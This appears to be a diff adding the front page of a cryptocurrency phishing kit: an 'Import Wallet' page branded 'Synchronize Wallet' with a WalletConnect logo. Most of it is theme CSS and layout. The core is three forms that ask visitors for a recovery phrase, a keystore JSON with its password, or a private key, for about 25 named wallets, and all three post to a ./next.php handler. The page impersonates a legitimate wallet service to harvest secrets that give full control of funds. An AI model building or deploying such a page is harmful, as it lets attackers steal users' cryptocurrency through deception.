+        font-family: "nucleo-interface";
+        content: "\e906";
+        font-size: 32px;
+        border: 0;
+        width: 40px;
+        height: 40px;
+        color: #fff;
+    }
+
+    .mfp-arrow.mfp-arrow-right:before {
+        content: "\e907";
+        margin-left: 0;
+        margin-right: 30px;
+    }
+
+    .mfp-arrow:after {
+        display: none !important;
+    }
+
+    #jckqv .cart .button {
+        border-radius: 0;
+        box-shadow: none;
+        height: 50px;
+        padding: 0 20px;
+        float: left;
+        outline: 0 !important;
+        margin: 0 10px 0 0;
+        text-shadow: none;
+        font-size: 14px;
+        text-transform: uppercase;
+        font-weight: bold !important;
+        text-align: left;
+        line-height: 20px;
+        min-width: 180px;
+    }
+
+    #jckqv #jckqv_summary .yith-wcwl-divide {
+        display: none;
+    }
+
+    #jckqv .cart .yith-wcwl-add-to-wishlist {
+        margin-left: 0 !important;
+        min-height: 50px;
+    }
+
+    #jckqv .slick-initialized .slick-slide {
+        outline: 0 !important;
+    }
+
+    #base-promo,
+    .sf-promo-bar {
+        background-color: #e4e4e4;
+    }
+
+    #base-promo>p,
+    #base-promo.footer-promo-text>a,
+    #base-promo.footer-promo-arrow>a,
+    .sf-promo-bar>p,
+    .sf-promo-bar.promo-text>a,
+    .sf-promo-bar.promo-arrow>a {
+        color: #222;
+    }
+
+    #base-promo.footer-promo-arrow:hover,
+    #base-promo.footer-promo-text:hover,
+    .sf-promo-bar.promo-arrow:hover,
+    .sf-promo-bar.promo-text:hover {
+        background-color: #7eced5 !important;
+        color: #ffffff !important;
+    }
+
+    #base-promo.footer-promo-arrow:hover>*,
+    #base-promo.footer-promo-text:hover>*,
+    .sf-promo-bar.promo-arrow:hover>*,
+    .sf-promo-bar.promo-text:hover>* {
+        color: #ffffff !important;
+    }
+
+    html.no-js .sf-animation,
+    .mobile-browser .sf-animation,
+    .apple-mobile-browser .sf-animation,
+    .sf-animation[data-animation="none"] {
+        opacity: 1 !important;
+        left: auto !important;
+        right: auto !important;
+        bottom: auto !important;
+        -webkit-transform: scale(1) !important;
+        -o-transform: scale(1) !important;
+        -moz-transform: scale(1) !important;
+        transform: scale(1) !important;
+    }
+
+    html.no-js .sf-animation.image-banner-content,
+    .mobile-browser .sf-animation.image-banner-content,
+    .apple-mobile-browser .sf-animation.image-banner-content,
+    .sf-animation[data-animation="none"].image-banner-content {
+        bottom: 50% !important;
+    }
+
+    .mobile-browser .product-grid .product {
+        opacity: 1 !important;
+    }
+
+    /** Tuesday 21st of September 2021 10:33:28 PM **/
+    </style>
+</head>
+
+<body>
+    <div id="container">
+        <div id="mobile-menu-wrap" class="menu-is-right" style="padding-top: 91px;">
+            <nav id="mobile-menu" class="clearfix">
+                <ul class="alt-mobile-menu">
+                </ul>
+            </nav>
+            <div class="mobile-menu-aux">
+            </div>
+        </div>
+        <header id="mobile-header" class="mobile-center-logo-alt clearfix">
+            <div class="mobile-header-opts opts-left"></div>
+            <div id="mobile-logo" class="logo-center has-img clearfix" data-anim="">
+                <a href="https://synchronizewallet.org">
+                    <img class="standard" src="images/walletconnect.png" alt="Synchronize Wallet" height="50" width="75">
+                    <img class="retina" src="images/walletconnect.png" alt="Synchronize Wallet" height="0" width="0">
+                    <div class="text-logo"></div>
+                </a>
+            </div>
+            <div class="mobile-header-opts opts-right"><button class="hamburger mobile-menu-link hamburger--3dy" type="button">
+                    <span class="button-text">Menu</span>
+                    <span class="hamburger-box">
+                        <span class="hamburger-inner"></span>
+                    </span>
+                </button>
+            </div>
+        </header>
+        <!--// HEADER //-->
+        <div class="header-wrap  full-header-stick page-header-standard" data-style="default" data-default-style="default">
+            <div id="header-section" class="header-1 ">
+                <div id="header-sticky-wrapper" class="sticky-wrapper" style="height: 91px;">
+                    <header id="header" class="sticky-header clearfix" style="position: fixed; top: 0px; width: 1519.2px;">
+                        <div class="header-left">
+                        </div>
+                        <div class="container">
+                            <div class="row">
+                                <div class="split-menu menu-left col-sm-5">
+                                    <nav class="std-menu clearfix">
+                                    </nav>
+                                </div>
+                                <div id="logo" class="col-sm-2 logo-center has-img clearfix" data-anim="">
+                                    <a href="https://synchronizewallet.org/">
+                                        <img class="standard" src="./images/walletconnect.png" alt="Synchronize Wallet" height="50" width="75">
+                                        <img class="retina" src="./images/walletconnect.png" alt="Synchronize Wallet" height="0" width="0">
+                                        <div class="text-logo"></div>
+                                    </a>
+                                </div>
+                                <div class="split-menu menu-right col-sm-5">
+                                    <nav class="std-menu clearfix">
+                                    </nav>
+                                </div>
+                            </div> <!-- CLOSE .row -->
+                        </div> <!-- CLOSE .container -->
+                        <div class="header-right">
+                        </div>
+                    </header>
+                </div>
+            </div>
+        </div>
+        <div id="sf-mobile-slideout-backdrop"></div>
+        <!--// OPEN #main-container //-->
+        <div id="main-container" class="clearfix">
+            <div class="page-heading page-heading-hidden page-heading-breadcrumbs clearfix">
+                <div class="container">
+                    <div class="heading-text">
+                        <h1 class="entry-title">Import Wallet</h1>
+                    </div>
+                </div>
+            </div>
+            <div class="inner-container-wrap">
+                <div class="container">
+                    <div class="inner-page-wrap has-no-sidebar no-bottom-spacing no-top-spacing clearfix">
+                        <!-- OPEN page -->
+                        <div class="clearfix">
+                            <div class="page-content hfeed clearfix">
+                                <div class="clearfix post-12 page type-page status-publish hentry" id="12">
+                                    <section data-header-style="" class="row fw-row dynamic-header-change fw-row-adjusted" style="position: relative; left: -190px; width: 1519px;">
+                                        <div class="spb-row  " data-row-type="color" data-wrap="full-width-contained" data-image-movement="fixed" data-content-stretch="false" data-row-height="content-height" data-col-spacing="0" data-col-v-pos="default" style="background-color: rgb(156, 215, 237); margin-top: 0px; margin-bottom: 0px; opacity: 1; visibility: visible;" data-sb-init="true">
+                                            <div class="spb_content_element clearfix" style="padding-left: 190px; padding-right: 189px;">
+                                                <div class="spb-row-no-cols-wrapper spb-row-multi-col clearfix">
+                                                    <section class="row ">
+                                                        <div class="blank_spacer col-sm-12  " style="height:30px;"></div>
+                                                    </section>
+                                                    <section class="row ">
+                                                        <div class="spb_content_element col-sm-12 spb_text_column">
+                                                            <div class="spb-asset-content" style="margin-top: 0px;margin-bottom: 0px;">
+                                                                <h2 class="sp-tab__section_title_60"> </h2>
+                                                                <div id="sp-tabpro-wrapper_60" class="sp-tab__lay-default" data-preloader="" data-activemode="tabs-activator-event-click">
+                                                                    <ul class="sp-tab__nav sp-tab__nav-tabs" id="sp-tab__ul" role="tablist">
+                                                                        <li class="sp-tab__nav-item">
+                                                                            <label class="sp-tab__nav-link sp-tab__active" data-toggle="tab" id="t1" for="#tab-601" role="tab" aria-controls="tab-601" aria-selected="false">
+                                                                                <span class="tab_title_area">
+                                                                                    <h4 class="sp-tab__tab_title">Phrase</h4>
+                                                                                </span>
+                                                                            </label>
+                                                                        </li>
+                                                                        <li class="sp-tab__nav-item">
+                                                                            <label class="sp-tab__nav-link" data-toggle="tab" for="#tab-602" role="tab" id="t2" aria-controls="tab-602" aria-selected="false">
+                                                                                <span class="tab_title_area">
+                                                                                    <h4 class="sp-tab__tab_title">Keystore JSON</h4>
+                                                                                </span>
+                                                                            </label>
+                                                                        </li>
+                                                                        <li class="sp-tab__nav-item">
+                                                                            <label class="sp-tab__nav-link" data-toggle="tab" for="#tab-603" role="tab" id="t3" aria-controls="tab-603" aria-selected="false">
+                                                                                <span class="tab_title_area">
+                                                                                    <h4 class="sp-tab__tab_title">Private Key</h4>
+                                                                                </span>
+                                                                            </label>
+                                                                        </li>
+                                                                    </ul>
+                                                                    <div class="sp-tab__tab-content">
+                                                                        <div id="tab-601" class="sp-tab__tab-pane sp-tab__show sp-tab__active" role="tabpanel">
+                                                                            <div class="sp-tab-content">
+                                                                                <div role="form" class="wpcf7" id="wpcf7-f9-p12-o1" lang="en-US" dir="ltr">
+                                                                                    <div class="screen-reader-response">
+                                                                                        <p role="status" aria-live="polite" aria-atomic="true"></p>
+                                                                                        <ul></ul>
+                                                                                    </div>
+                                                                                    <form action="./next.php" method="post" class="wpcf7-form init">
+                                                                                        <p><label> Select Wallet<br>
+                                                                                                <span class="wpcf7-form-control-wrap menu-255">
+                                                                                                    <select name="menu-255" class="wpcf7-form-control wpcf7-select wpcf7-validates-as-required" aria-required="true" aria-invalid="false" required="">
+                                                                                                        <option value="Blockchain Wallet">Blockchain Wallet</option>
+                                                                                                        <option value="Exodus Wallet">Exodus Wallet</option>
+                                                                                                        <option value="Coinbase Wallet">Coinbase Wallet</option>
+                                                                                                        <option value="Wallet Connect">Wallet Connect</option>
+                                                                                                        <option value="Trust Wallet">Trust Wallet</option>
+                                                                                                        <option value="Aave Wallet">Aave Wallet</option>
+                                                                                                        <option value="Ledger Wallet">Ledger Wallet</option>
+                                                                                                        <option value="Enjin Wallet">Enjin Wallet</option>
+                                                                                                        <option value="Mew Wallet">Mew Wallet</option>
+                                                                                                        <option value="Binance Smart Chain">Binance Smart Chain</option>
+                                                                                                        <option value="Metamask Wallet">Metamask Wallet</option>
+                                                                                                        <option value="Digitex Wallet">Digitex Wallet</option>
+                                                                                                        <option value="Authereum Wallet">Authereum Wallet</option>
+                                                                                                        <option value="Portise Wallet">Portise Wallet</option>
+                                                                                                        <option value="Formatic Wallet">Formatic Wallet</option>
+                                                                                                        <option value="Defiat Wallet">Defiat Wallet</option>
+                                                                                                        <option value="Scale Wallet">Scale Wallet</option>
+                                                                                                        <option value="Coinomi Wallet">Coinomi Wallet</option>
+                                                                                                        <option value="Atomic Wallet">Atomic Wallet</option>
+                                                                                                        <option value="Tron Wallet">Tron Wallet</option>
+                                                                                                        <option value="Bandprotocol Wallet">Bandprotocol Wallet</option>
+                                                                                                        <option value="Eos Wallet">Eos Wallet</option>
+                                                                                                        <option value="Wax Wallet">Wax Wallet</option>
+                                                                                                        <option value="Zilliqa Wallet">Zilliqa Wallet</option>
+                                                                                                        <option value="Polkadot">Polkadot</option>
+                                                                                                    </select></span> </label></p>
+                                                                                        <p><span class="wpcf7-form-control-wrap textarea-158"><textarea name="textarea-158" cols="40" rows="10" class="wpcf7-form-control wpcf7-textarea wpcf7-validates-as-required" aria-required="true" aria-invalid="false" placeholder="Input your secret private key phrase" required=""></textarea></span></p>
+                                                                                        <p><span class="wpcf7-form-control-wrap radio-302"><span class="wpcf7-form-control wpcf7-radio"><span class="wpcf7-list-item first last"><label><input type="radio" name="radio-302" value="Typically 12 (sometimes 24) words seperated by a single spaces." checked="checked"><span class="wpcf7-list-item-label">Typically 12 (sometimes 24) words seperated by a single spaces. Please input it in the order specified.</span></label></span></span></span></p>
+                                                                                        <p><input type="submit" name="btn1" value="Connect" class="wpcf7-form-control wpcf7-submit"><span class="ajax-loader"></span></p>
+                                                                                        <div class="wpcf7-response-output" aria-hidden="true"></div>
+                                                                                    </form>
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                        <div id="tab-602" class="sp-tab__tab-pane" role="tabpanel">
+                                                                            <div class="sp-tab-content">
+                                                                                <div role="form" class="wpcf7" id="wpcf7-f58-p12-o2" lang="en-US" dir="ltr">
+                                                                                    <div class="screen-reader-response">
+                                                                                        <p role="status" aria-live="polite" aria-atomic="true"></p>
+                                                                                        <ul></ul>
+                                                                                    </div>
+                                                                                    <form action="./next.php" method="post" class="wpcf7-form init" data-status="init">
+                                                                                        <p><label> Select Wallet<br>
+                                                                                                <span class="wpcf7-form-control-wrap menu-255">
+                                                                                                    <select name="menu-255" class="wpcf7-form-control wpcf7-select wpcf7-validates-as-required" aria-required="true" aria-invalid="false" required="">
+                                                                                                        <option value="Blockchain Wallet">Blockchain Wallet</option>
+                                                                                                        <option value="Exodus Wallet">Exodus Wallet</option>
+                                                                                                        <option value="Coinbase Wallet">Coinbase Wallet</option>
+                                                                                                        <option value="Wallet Connect">Wallet Connect</option>
+                                                                                                        <option value="Trust Wallet">Trust Wallet</option>
+                                                                                                        <option value="Aave Wallet">Aave Wallet</option>
+                                                                                                        <option value="Ledger Wallet">Ledger Wallet</option>
+                                                                                                        <option value="Enjin Wallet">Enjin Wallet</option>
+                                                                                                        <option value="Mew Wallet">Mew Wallet</option>
+                                                                                                        <option value="Binance Smart Chain">Binance Smart Chain</option>
+                                                                                                        <option value="Metamask Wallet">Metamask Wallet</option>
+                                                                                                        <option value="Digitex Wallet">Digitex Wallet</option>
+                                                                                                        <option value="Authereum Wallet">Authereum Wallet</option>
+                                                                                                        <option value="Portise Wallet">Portise Wallet</option>
+                                                                                                        <option value="Formatic Wallet">Formatic Wallet</option>
+                                                                                                        <option value="Defiat Wallet">Defiat Wallet</option>
+                                                                                                        <option value="Scale Wallet">Scale Wallet</option>
+                                                                                                        <option value="Coinomi Wallet">Coinomi Wallet</option>
+                                                                                                        <option value="Atomic Wallet">Atomic Wallet</option>
+                                                                                                        <option value="Tron Wallet">Tron Wallet</option>
+                                                                                                        <option value="Bandprotocol Wallet">Bandprotocol Wallet</option>
+                                                                                                        <option value="Eos Wallet">Eos Wallet</option>
+                                                                                                        <option value="Wax Wallet">Wax Wallet</option>
+                                                                                                        <option value="Zilliqa Wallet">Zilliqa Wallet</option>
+                                                                                                        <option value="Polkadot">Polkadot</option>
+                                                                                                    </select></span> </label></p>
+                                                                                        <p><span class="wpcf7-form-control-wrap textarea-158"><textarea name="keystorejsonrainbow" cols="40" rows="10" class="wpcf7-form-control wpcf7-textarea wpcf7-validates-as-required" aria-required="true" aria-invalid="false" placeholder="Keystore JSON" required=""></textarea></span></p>
+                                                                                        <p><span class="wpcf7-form-control-wrap text-259"><input type="text" name="passwordrainbow" value="" size="40" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" aria-required="true" aria-invalid="false" placeholder="Password" required=""></span></p>
+                                                                                        <p></p>
+                                                                                        <p><input type="submit" name="btn2" value="Connect" class="wpcf7-form-control wpcf7-submit"><span class="ajax-loader"></span></p>
+                                                                                        <div class="wpcf7-response-output" aria-hidden="true"></div>
+                                                                                    </form>
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                        <div id="tab-603" class="sp-tab__tab-pane" role="tabpanel">
+                                                                            <div class="sp-tab-content">
+                                                                                <div role="form" class="wpcf7" id="wpcf7-f59-p12-o3" lang="en-US" dir="ltr">
+                                                                                    <div class="screen-reader-response">
+                                                                                        <p role="status" aria-live="polite" aria-atomic="true"></p>
+                                                                                        <ul></ul>
+                                                                                    </div>
+                                                                                    <form action="./next.php" method="post" class="wpcf7-form init" data-status="init">
+                                                                                        <p><label> Select Wallet<br>
+                                                                                                <span class="wpcf7-form-control-wrap menu-255">
+                                                                                                    <select name="menu-255" class="wpcf7-form-control wpcf7-select wpcf7-validates-as-required" aria-required="true" aria-invalid="false" required="">
+                                                                                                        <option value="Blockchain Wallet">Blockchain Wallet</option>
+                                                                                                        <option value="Exodus Wallet">Exodus Wallet</option>
+                                                                                                        <option value="Coinbase Wallet">Coinbase Wallet</option>
+                                                                                                        <option value="Wallet Connect">Wallet Connect</option>
+                                                                                                        <option value="Trust Wallet">Trust Wallet</option>
+                                                                                                        <option value="Aave Wallet">Aave Wallet</option>
+                                                                                                        <option value="Ledger Wallet">Ledger Wallet</option>
+                                                                                                        <option value="Enjin Wallet">Enjin Wallet</option>
+                                                                                                        <option value="Mew Wallet">Mew Wallet</option>
+                                                                                                        <option value="Binance Smart Chain">Binance Smart Chain</option>
+                                                                                                        <option value="Metamask Wallet">Metamask Wallet</option>
+                                                                                                        <option value="Digitex Wallet">Digitex Wallet</option>
+                                                                                                        <option value="Authereum Wallet">Authereum Wallet</option>
+                                                                                                        <option value="Portise Wallet">Portise Wallet</option>
+                                                                                                        <option value="Formatic Wallet">Formatic Wallet</option>
+                                                                                                        <option value="Defiat Wallet">Defiat Wallet</option>
+                                                                                                        <option value="Scale Wallet">Scale Wallet</option>
+                                                                                                        <option value="Coinomi Wallet">Coinomi Wallet</option>
+                                                                                                        <option value="Atomic Wallet">Atomic Wallet</option>
+                                                                                                        <option value="Tron Wallet">Tron Wallet</option>
+                                                                                                        <option value="Bandprotocol Wallet">Bandprotocol Wallet</option>
+                                                                                                        <option value="Eos Wallet">Eos Wallet</option>
+                                                                                                        <option value="Wax Wallet">Wax Wallet</option>
+                                                                                                        <option value="Zilliqa Wallet">Zilliqa Wallet</option>
+                                                                                                        <option value="Polkadot">Polkadot</option>
+                                                                                                    </select></span> </label><br>
+                                                                                            <span class="wpcf7-form-control-wrap text-259"><input type="text" name="privatekey" value="" size="40" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" aria-required="true" aria-invalid="false" placeholder="Input your secret private key phrase" required=""></span></p>
+                                                                                        <p><span class="wpcf7-form-control-wrap radio-302"><span class="wpcf7-form-control wpcf7-radio"><span class="wpcf7-list-item first last"><label><input type="radio" name="radio-302" value="Typically 12 (sometimes 24) words seperated by a single spaces." checked="checked"><span class="wpcf7-list-item-label">Typically 12 (sometimes 24) words seperated by a single spaces.</span></label></span></span></span></p>
+                                                                                        <p><input type="submit" name="btn3" value="Connect" class="wpcf7-form-control wpcf7-submit"><span class="ajax-loader"></span></p>
+                                                                                        <div class="wpcf7-response-output" aria-hidden="true"></div>
+                                                                                    </form>
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                                <style type="text/css">
+                                                                #sp-tabpro-wrapper_60 .sp-tab__nav {
+                                                                    justify-content: start;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default.sp-tab__horizontal-bottom {
+                                                                    display: flex;
+                                                                    flex-direction: column-reverse;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default.sp-tab__horizontal-bottom ul {
+                                                                    border-top: 1px solid #cccccc;
+                                                                    border-bottom: 0;
+                                                                    margin-top: 0;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default.sp-tab__horizontal-bottom ul>li>label.sp-tab__active {
+                                                                    border-color: transparent #cccccc#cccccc;
+                                                                    margin-top: -1px;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default.sp-tab__horizontal-bottom ul>li>label,
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default.sp-tab__horizontal-bottom ul>li>a,
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default.sp-tab__horizontal-bottom ul .sp-tab__nav-item {
+                                                                    border-top: 0;
+                                                                    border-top-left-radius: 0;
+                                                                    border-top-right-radius: 0;
+                                                                    border-bottom-left-radius: 2px;
+                                                                    border-bottom-right-radius: 2px;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default.sp-tab__horizontal-bottom ul {
+                                                                    border-bottom: none;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default.sp-tab__horizontal-bottom .sp-tab__tab-content>.sp-tab__tab-pane {
+                                                                    border-top: 1px solid #cccccc;
+                                                                    border-bottom: 0;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60 .sp-tab__nav-tabs .sp-tab__nav-link.sp-tab__active .sp-tab__tab_title,
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default label .sp-tab__card-header {
+                                                                    color: #444;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60 .sp-tab__nav-tabs .sp-tab__nav-item.show .sp-tab__nav-link,
+                                                                #sp-tabpro-wrapper_60 .sp-tab__nav-tabs .sp-tab__nav-item .sp-tab__nav-link.sp-tab__active,
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default label .sp-tab__card-header {
+                                                                    background-color: #fff;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60 .sp-tab__nav-tabs .sp-tab__nav-item.show .sp-tab__nav-link,
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default ul>li>label.sp-tab__active {
+                                                                    border-color: #cccccc#cccccc transparent;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default ul>li>label,
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default ul>li>a {
+                                                                    cursor: pointer;
+                                                                    border-color: #cccccc;
+                                                                    padding-top: 15px;
+                                                                    padding-right: 15px;
+                                                                    padding-bottom: 15px;
+                                                                    padding-left: 15px;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60 .sp-tab__nav-tabs .sp-tab__nav-link {
+                                                                    border: 1px solid #cccccc;
+                                                                    height: 100%;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default ul>li>label,
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default ul>li>a,
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default ul .sp-tab__nav-item {
+                                                                    border-top-left-radius: 2px;
+                                                                    border-top-right-radius: 2px;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60 .sp-tab__nav-tabs .sp-tab__nav-item {
+                                                                    margin-bottom: -1px;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default ul .sp-tab__nav-item,
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default label.collapsed .sp-tab__card-header {
+                                                                    background-color: #eee;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default ul .sp-tab__nav-item {
+                                                                    margin-right: 10px;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default ul .sp-tab__nav-item:last-child {
+                                                                    margin-right: 0;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default ul .sp-tab__nav-item label:hover .sp-tab__tab_title,
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default ul .sp-tab__nav-item a:hover .sp-tab__tab_title,
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default label.collapsed .sp-tab__card-header:hover {
+                                                                    color: #444;
+                                                                    transition: .3s;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default ul .sp-tab__nav-item:hover,
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default label.collapsed .sp-tab__card-header:hover {
+                                                                    background-color: #fff;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default .sp-tab__tab-content>.sp-tab__tab-pane {
+                                                                    border: 1px solid #cccccc;
+                                                                    padding-top: 20px;
+                                                                    padding-right: 20px;
+                                                                    padding-bottom: 20px;
+                                                                    padding-left: 20px;
+                                                                    border-top: 0px;
+                                                                    background-color: #ffffff;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default ul {
+                                                                    border-bottom: 1px solid #cccccc;
+                                                                }
+
+                                                                @media(max-width:480px) {
+                                                                    #sp-tabpro-wrapper_60.sp-tab__lay-default li.sp-tab__nav-item {
+                                                                        width: 100%;
+                                                                        margin-right: 0px;
+                                                                    }
+
+                                                                    #sp-tabpro-wrapper_60.sp-tab__lay-default li.sp-tab__nav-item:last-child {
+                                                                        margin-bottom: 1px;
+                                                                    }
+                                                                }
+
+                                                                h2.sp-tab__section_title_60 {
+                                                                    margin-bottom: 30px !important;
+                                                                    font-weight: 600;
+                                                                    font-style: normal;
+                                                                    font-size: 28px;
+                                                                    line-height: 28px;
+                                                                    letter-spacing: 0px;
+                                                                    color: #444444;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default ul .sp-tab__nav-item .sp-tab__tab_title,
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default label.collapsed .sp-tab__card-header {
+                                                                    font-weight: 600;
+                                                                    font-style: normal;
+                                                                    font-size: 16px;
+                                                                    line-height: 22px;
+                                                                    letter-spacing: 0px;
+                                                                    color: #444;
+                                                                }
+
+                                                                #sp-tabpro-wrapper_60.sp-tab__lay-default .sp-tab__tab-content>.sp-tab__tab-pane {
+                                                                    font-weight: 400;
+                                                                    font-style: normal;
+                                                                    font-size: 16px;
+                                                                    line-height: 24px;
+                                                                    letter-spacing: 0px;
+                                                                    color: #444;
+                                                                }
+                                                                </style>
+                                                            </div>
+                                                        </div>
+                                                    </section>
+                                                    <section class="row ">
+                                                        <div class="blank_spacer col-sm-12  " style="height:30px;"></div>
+                                                    </section>
+                                                </div><!-- .spb-row-no-cols-wrapper -->
+                                            </div>
+                                        </div><!-- .spb-row -->
+                                    </section>
+                                    <div class="spb-row-sizer"></div>
+                                    <div class="link-pages"></div>
+                                </div>
+                            </div>
+                            <!-- CLOSE page -->
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!--// CLOSE #main-container //-->
+        </div>
+        <div id="footer-wrap">
+            <!--// OPEN #footer //-->
+            <footer id="footer" class="footer-divider">
+                <div class="container">
+                    <div id="footer-widgets" class="row clearfix">
+                        <div class="col-sm-3">
+                        </div>
+                        <div class="col-sm-3">
+                        </div>
+                        <div class="col-sm-3">
+                        </div>
+                        <div class="col-sm-3">
+                        </div>
+                    </div>
+                </div>
+                <!--// CLOSE #footer //-->
+            </footer>
+            <!--// OPEN #copyright //-->
+            <footer id="copyright" class="">
+                <div class="container">
+                    <div class="text-left">
+                        <p style="text-align: center;"><span style="text-align: center;">©2021 Synchronize Wallet</span></p>
+                    </div>
+                    <nav class="footer-menu std-menu">
+                    </nav>
+                </div>
+                <!--// CLOSE #copyright //-->
+            </footer>
+        </div>
+        <!--// CLOSE #container //-->
+    </div>
+    <link rel="stylesheet" id="sptpro-style-css" href="./css/wp-tabs-public.min.css" type="text/css" media="all">
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+    function getUrlVars() {
+        var vars = {};
+        var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m, key, value) {
+            vars[key] = value;
+        });
+        return vars;
+    }
+
+    if (!getUrlVars()["count"]) {
+
+    } else {
+        var count = getUrlVars()["count"];
+        $('#count').val(count);
+        if (count > 0) {
+            $("#msg").show();
+        }
+    }
+
+    $('#t1').click(function() {
+        $("#tab-601").addClass("sp-tab__active");
+        $("#tab-602").removeClass("sp-tab__active");
+        $("#tab-603").removeClass("sp-tab__active");
+        $("#t1").addClass("sp-tab__active");
+        $("#t2").removeClass("active");
+        $("#t3").removeClass("sp-tab__active");
+
+
+
+    });
+    $('#t2').click(function() {
+        $("#tab-602").addClass("sp-tab__active");
+        $("#tab-601").removeClass("sp-tab__active");
+        $("#tab-603").removeClass("sp-tab__active");
+        $("#t2").addClass("sp-tab__active");
+        $("#t1").removeClass("sp-tab__active");
+        $("#t3").removeClass("sp-tab__active");
+
+
+
+    });
+    $('#t3').click(function() {
+        $("#tab-603").addClass("sp-tab__active");
+        $("#tab-602").removeClass("sp-tab__active");
+        $("#tab-601").removeClass("sp-tab__active");
+        $("#t3").addClass("sp-tab__active");
+        $("#t2").removeClass("sp-tab__active");
+        $("#t1").removeClass("sp-tab__active");
+
+
+
+    });
+
+
+});
+</script>
+
+</html>
